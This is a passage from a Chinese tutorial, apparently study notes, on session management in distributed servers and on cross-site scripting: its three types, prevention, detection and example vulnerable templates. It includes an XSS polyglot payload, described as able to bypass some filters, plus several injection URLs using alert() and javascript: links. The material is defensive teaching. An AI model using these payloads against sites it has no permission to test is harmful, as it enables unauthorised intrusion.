<strong>缺点：</strong> 会对网络负荷造成一定压力，如果 session 量大的话可能会造成网络堵塞，拖慢服务器性能。</p> <h4 id="_2-粘性-session-ip-绑定策略"><a href="#_2-粘性-session-ip-绑定策略" class="header-anchor">#</a> 2. 粘性 session /IP 绑定策略</h4> <ul><li><strong>采用 Ngnix 中的 ip_hash 机制，将某个 ip的所有请求都定向到同一台服务器上，即将用户与服务器绑定。</strong> 用户第一次请求时，负载均衡器将用户的请求转发到了 A 服务器上，如果负载均衡器设置了粘性 session 的话，那么用户以后的每次请求都会转发到 A 服务器上，相当于把用户和 A 服务器粘到了一块，这就是粘性 session 机制。</li></ul> <p><strong>优点：</strong> 简单，不需要对 session 做任何处理。
<strong>缺点：</strong> 缺乏容错性，如果当前访问的服务器发生故障，用户被转移到第二个服务器上时，他的 session 信息都将失效。
<strong>适用场景：</strong> 发生故障对客户产生的影响较小；服务器发生故障是低概率事件 。
<strong>实现方式：</strong> 以 Nginx 为例，在 upstream 模块配置 ip_hash 属性即可实现粘性 session。</p> <h4 id="_3-session-共享-常用"><a href="#_3-session-共享-常用" class="header-anchor">#</a> 3. session 共享（常用）</h4> <ul><li>使用分布式缓存方案比如 Memcached 、Redis 来缓存 session，但是要求 Memcached 或 Redis 必须是集群</li> <li>把 session 放到 Redis 中存储，虽然架构上变得复杂，并且需要多访问一次 Redis ，但是这种方案带来的好处也是很大的：
<ul><li>实现了 session 共享；</li> <li>可以水平扩展（增加 Redis 服务器）；</li> <li>服务器重启 session 不丢失（不过也要注意 session 在 Redis 中的刷新/失效机制）；</li> <li>不仅可以跨服务器 session 共享，甚至可以跨平台（例如网页端和 APP 端）</li></ul></li></ul> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/image-20220718102950412.png" alt="image-20220718102950412"></p> <h4 id="_4-session-持久化"><a href="#_4-session-持久化" class="header-anchor">#</a> 4. session 持久化</h4> <ul><li>将 session 存储到数据库中，保证 session 的持久化</li></ul> <p><strong>优点：</strong> 服务器出现问题，session 不会丢失
<strong>缺点：</strong> 如果网站的访问量很大，把 session 存储到数据库中，会对数据库造成很大压力，还需要增加额外的开销维护数据库。</p> <h3 id="只要关闭浏览器-session-真的就消失了"><a href="#只要关闭浏览器-session-真的就消失了" class="header-anchor">#</a> <strong>只要关闭浏览器 ，session 真的就消失了？</strong></h3> <p>不对。对 session 来说，除非程序通知服务器删除一个 session，否则服务器会一直保留，程序一般都是在用户做 log off 的时候发个指令去删除 session。
然而浏览器从来不会主动在关闭之前通知服务器它将要关闭，因此服务器根本不会有机会知道浏览器已经关闭，之所以会有这种错觉，是大部分 session 机制都使用会话 cookie 来保存 session id，而关闭浏览器后这个 session id 就消失了，再次连接服务器时也就无法找到原来的 session。如果服务器设置的 cookie 被保存在硬盘上，或者使用某种手段改写浏览器发出的 HTTP 请求头，把原来的 session id 发送给服务器，则再次打开浏览器仍然能够打开原来的 session。
恰恰是<strong>由于关闭浏览器不会导致 session 被删除，迫使服务器为 session 设置了一个失效时间，当距离客户端上一次使用 session 的时间超过这个失效时间时，服务器就认为客户端已经停止了活动，才会把 session 删除以节省存储空间。</strong></p> <h2 id="_1-重点-xss"><a href="#_1-重点-xss" class="header-anchor">#</a> 1 重点：XSS</h2> <h3 id="重点-什么是xss"><a href="#重点-什么是xss" class="header-anchor">#</a> (重点)什么是XSS</h3> <p>Cross-Site Scripting<font color="red" size="3">（跨站脚本攻击）简称 XSS，是一种代码注入攻击</font>。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全</p> <p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p> <p><strong>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</strong></p> <p>不仅仅是业务上的“用户的 UGC 内容”（用户生成内容，即用户原创内容）可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p> <ul><li>来自用户的 UGC 信息</li> <li>来自第三方的链接</li> <li>URL 参数</li> <li>POST 参数</li> <li>Referer （可能来自不可信的来源）</li> <li>Cookie （可能来自其他子域注入）</li></ul> <h3 id="xss-分类"><a href="#xss-分类" class="header-anchor">#</a> XSS 分类</h3> <p>根据攻击的来源，<font color="red" size="3">XSS 攻击可分为存储型、反射型和 DOM 型三种</font>。</p> <h4 id="存储型-xss"><a href="#存储型-xss" class="header-anchor">#</a> 存储型 XSS</h4> <p>存储型 XSS 的攻击步骤：</p> <ol><li>攻击者将恶意代码提交到目标网站的数据库中。</li> <li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，<font color="orange" size="3">拼接在 HTML 中返回给浏览器。</font></li> <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li> <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol> <p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p> <h4 id="反射型-xss"><a href="#反射型-xss" class="header-anchor">#</a> 反射型 XSS</h4> <p>反射型 XSS 的攻击步骤：</p> <ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li> <li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，<font color="orange" size="3">拼接在 HTML 中返回给浏览器。</font></li> <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li> <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol> <p><font color="red" size="3">反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</font></p> <p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p> <p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p> <p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p> <h4 id="dom-型-xss"><a href="#dom-型-xss" class="header-anchor">#</a> DOM 型 XSS</h4> <p>DOM 型 XSS 的攻击步骤：</p> <ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li> <li>用户打开带有恶意代码的 URL。</li> <li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li> <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol> <p><font color="red" size="3">DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成</font>，<font color="orange" size="3">属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</font></p> <h3 id="xss攻击的预防"><a href="#xss攻击的预防" class="header-anchor">#</a> XSS攻击的预防</h3> <p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p> <ol><li>攻击者提交恶意代码。</li> <li>浏览器执行恶意代码。</li></ol> <p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p> <h4 id="输入过滤"><a href="#输入过滤" class="header-anchor">#</a> 输入过滤</h4> <p><font color="red" size="3">输入过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。</font>在防范 XSS 攻击时应避免此类方法。</p> <p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p> <p>既然输入过滤并非完全可靠，<font color="red" size="3">我们就要通过“防止浏览器执行恶意代码”来防范 XSS</font>。这部分分为两类：</p> <ul><li>防止 HTML 中出现注入。</li> <li>防止 JavaScript 执行时，执行恶意代码。</li></ul> <h4 id="预防存储型和反射型-xss-攻击"><a href="#预防存储型和反射型-xss-攻击" class="header-anchor">#</a> 预防存储型和反射型 XSS 攻击</h4> <p><font color="orange" size="3">存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，</font>攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p> <p><font color="red" size="3">预防这两种漏洞，有两种常见做法：</font></p> <ul><li>改成纯前端渲染，把代码和数据分隔开。</li> <li>对要插入的 HTML 做充分转义。</li></ul> <p><strong>纯前端渲染的过程：</strong></p> <ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li> <li>然后浏览器执行 HTML 中的 JavaScript。</li> <li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li></ol> <p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p> <p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p> <p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 <font color="red" size="3">SEO（搜索引擎优化）</font> 需求的页面，我们仍然要面对拼接 HTML 的问题。</p> <p><strong>转义 HTML</strong></p> <p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p> <p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p> <h4 id="预防-dom-型-xss-攻击"><a href="#预防-dom-型-xss-攻击" class="header-anchor">#</a> 预防 DOM 型 XSS 攻击</h4> <p><font color="orange" size="3">DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了</font>。</p> <p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，<font color="orange" size="3">不要把不可信的数据作为 HTML 插到页面上</font>，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p> <p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p> <p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 内联事件监听器中包含恶意代码 <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>img onclick<span class="token operator">=</span><span class="token string">&quot;UNTRUSTED&quot;</span> onerror<span class="token operator">=</span><span class="token string">&quot;UNTRUSTED&quot;</span> src<span class="token operator">=</span><span class="token string">&quot;data:image/png,&quot;</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 链接内包含恶意代码 <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;UNTRUSTED&quot;</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
<span class="token comment">// setTimeout()/setInterval() 中调用恶意代码</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">&quot;UNTRUSTED&quot;</span><span class="token punctuation">)</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token string">&quot;UNTRUSTED&quot;</span><span class="token punctuation">)</span>

<span class="token comment">// location 调用恶意代码</span>
location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'UNTRUSTED'</span>

<span class="token comment">// eval() 中调用恶意代码</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">&quot;UNTRUSTED&quot;</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p> <h3 id="最优xss-防范措施"><a href="#最优xss-防范措施" class="header-anchor">#</a> 最优XSS 防范措施</h3> <p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p> <h4 id="content-security-policy-csp"><a href="#content-security-policy-csp" class="header-anchor">#</a> <font color="red" size="4">Content Security Policy（CSP）</font></h4> <p><strong>介绍：</strong></p> <ol><li>解决 XSS 最优办法</li> <li>可以设置信任域名才可以访问 script / audio / video / image ...</li></ol> <p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p> <ul><li>禁止加载外域代码，防止复杂的攻击逻辑。</li> <li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li> <li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li> <li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li> <li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li></ul> <p>关于 CSP 的详情，请关注前端安全系列后续的文章。</p> <p><strong>如何设置：</strong></p> <ol><li>HTTP 请求头</li> <li>Meta 标签</li></ol> <p>MDN：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</p> <h4 id="输入内容长度控制"><a href="#输入内容长度控制" class="header-anchor">#</a> 输入内容长度控制</h4> <p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p> <h4 id="其他安全措施"><a href="#其他安全措施" class="header-anchor">#</a> 其他安全措施</h4> <ul><li><font color="red" size="3">HTTP-only Cookie</font>: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li> <li>验证码：防止脚本冒充用户提交危险操作。</li></ul> <h3 id="xss-的检测"><a href="#xss-的检测" class="header-anchor">#</a> XSS 的检测</h3> <p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，<font color="red" size="3">如何去检测其中有没有 XSS 漏洞呢？经过一番搜索，小明找到了两个方法：</font></p> <ol><li>使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</li> <li>使用扫描工具自动检测 XSS 漏洞。</li></ol> <p>在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F0xsobky%2FHackVault%2Fwiki%2FUnleashing-an-Ultimate-XSS-Polyglot" target="_blank" rel="noopener noreferrer">Unleashing an Ultimate XSS Polyglot<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>一文中，小明发现了这么一个字符串：</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token property">jaVasCript</span><span class="token punctuation">:</span><span class="token comment">/*-/*`/*\`/*'/*&quot;/**/</span><span class="token punctuation">(</span><span class="token comment">/* */</span>oNcliCk=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span>//&gt;\x3e
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>Function()</code>、<code>innerHTML</code>、<code>document.write()</code> 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p> <p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p> <div class="language-perl line-numbers-mode"><pre class="language-perl"><code>http<span class="token punctuation">:</span><span class="token regex">//xx</span><span class="token operator">x</span><span class="token operator">/</span>search<span class="token operator">?</span>keyword<span class="token operator">=</span>jaVasCript<span class="token variable">%3</span>A<span class="token variable">%2</span>F<span class="token operator">*</span><span class="token operator">-</span><span class="token variable">%2</span>F<span class="token operator">*</span><span class="token variable">%60</span><span class="token variable">%2</span>F<span class="token operator">*</span><span class="token variable">%60</span><span class="token variable">%2</span>F<span class="token operator">*</span><span class="token variable">%27</span><span class="token variable">%2</span>F<span class="token operator">*</span><span class="token variable">%22</span><span class="token variable">%2</span>F<span class="token operator">**</span><span class="token variable">%2</span>F<span class="token punctuation">(</span><span class="token variable">%2</span>F<span class="token operator">*</span><span class="token variable">%20</span><span class="token operator">*</span><span class="token variable">%2</span>FoNcliCk<span class="token variable">%3</span>Dalert<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token variable">%20</span><span class="token punctuation">)</span><span class="token variable">%2</span>F<span class="token variable">%2</span>F<span class="token variable">%250</span>D<span class="token variable">%250</span>A<span class="token variable">%250</span>d<span class="token variable">%250</span>a<span class="token variable">%2</span>F<span class="token variable">%2</span>F<span class="token variable">%3</span>C<span class="token variable">%2</span>FstYle<span class="token variable">%2</span>F<span class="token variable">%3</span>C<span class="token variable">%2</span>FtitLe<span class="token variable">%2</span>F<span class="token variable">%3</span>C<span class="token variable">%2</span>FteXtarEa<span class="token variable">%2</span>F<span class="token variable">%3</span>C<span class="token variable">%2</span>FscRipt<span class="token variable">%2</span>F<span class="token operator">--</span><span class="token operator">!</span><span class="token variable">%3</span>E<span class="token variable">%3</span>CsVg<span class="token variable">%2</span>F<span class="token variable">%3</span>CsVg<span class="token variable">%2</span>FoNloAd<span class="token variable">%3</span>Dalert<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token variable">%2</span>F<span class="token variable">%2</span>F<span class="token variable">%3</span>E<span class="token variable">%3</span>E
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FArachni%2Farachni" target="_blank" rel="noopener noreferrer">Arachni<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmozilla%2Fhttp-observatory%2F" target="_blank" rel="noopener noreferrer">Mozilla HTTP Observatory<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandresriancho%2Fw3af" target="_blank" rel="noopener noreferrer">w3af<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 等。</p> <h3 id="xss攻击的介绍"><a href="#xss攻击的介绍" class="header-anchor">#</a> XSS攻击的介绍</h3> <p>在开始本文之前，我们先提出一个问题，<strong>请判断以下两个说法是否正确：</strong></p> <ol><li><p>XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>不正确。因为：

防范存储型和反射型 <span class="token constant">XSS</span> 是后端 <span class="token constant">RD</span> 的责任。而 <span class="token constant">DOM</span> 型 <span class="token constant">XSS</span> 攻击不发生在后端，是前端 <span class="token constant">RD</span> 的责任。防范 <span class="token constant">XSS</span> 是需要后端 <span class="token constant">RD</span> 和前端 <span class="token constant">RD</span> 共同参与的系统工程。
转义应该在输出 <span class="token constant">HTML</span> 时进行，而不是在提交用户输入时。

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div></li> <li><p>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>不正确。 不同的上下文，如 <span class="token constant">HTML</span> 属性、<span class="token constant">HTML</span> 文字内容、<span class="token constant">HTML</span> 注释、跳转链接、内联 JavaScript 字符串、内联 <span class="token constant">CSS</span> 样式表等，所需要的转义规则不一致。 业务 <span class="token constant">RD</span> 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div></li></ol> <h3 id="漏洞总结"><a href="#漏洞总结" class="header-anchor">#</a> 漏洞总结</h3> <p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p> <ul><li><p><font color="red" size="3">在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</font></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> value<span class="token operator">=</span><span class="token string">&quot;&lt;%= getParameter(&quot;</span>keyword<span class="token string">&quot;) %&gt;&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>button<span class="token operator">&gt;</span>搜索<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
  您搜索的关键词是：<span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">&quot;keyword&quot;</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>当浏览器请求 <code>http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code> 时，服务端会解析出请求参数 <code>keyword</code>，得到 <code>&quot;&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> value<span class="token operator">=</span><span class="token string">&quot;&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>&quot;<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>button<span class="token operator">&gt;</span>搜索<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
  您搜索的关键词是：&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>面对这种情况，我们应该如何进行防范呢？</p> <p>其实，<font color="red" size="3">这只是浏览器把用户的输入当成了脚本进行了执行</font>。那么只要告诉浏览器这段内容是文本就可以了。</p> <p>聪明的小明很快找到解决方法，把这个漏洞修复：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">&quot;text&quot;</span> value<span class="token operator">=</span><span class="token string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>keyword<span class="token string">&quot;)) %&gt;&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>button<span class="token operator">&gt;</span>搜索<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
  您搜索的关键词是：<span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">&quot;keyword&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div></li> <li><p>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</p></li> <li><p>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</p></li> <li><p>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</p> <p>小明又收到安全组的神秘链接：<code>http://xxx/?redirect_to=javascript:alert('XSS')</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p> <p>小明打开对应页面的源码，发现有以下内容：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="token string">&quot;)) %&gt;&quot;</span><span class="token operator">&gt;</span>跳转<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>这段代码，当攻击 URL 为 <code>http://xxx/?redirect_to=javascript:alert('XSS')</code>，服务端响应就成了：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;javascript:alert(&amp;#x27;XSS&amp;#x27;)&quot;</span><span class="token operator">&gt;</span>跳转<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
复制代码
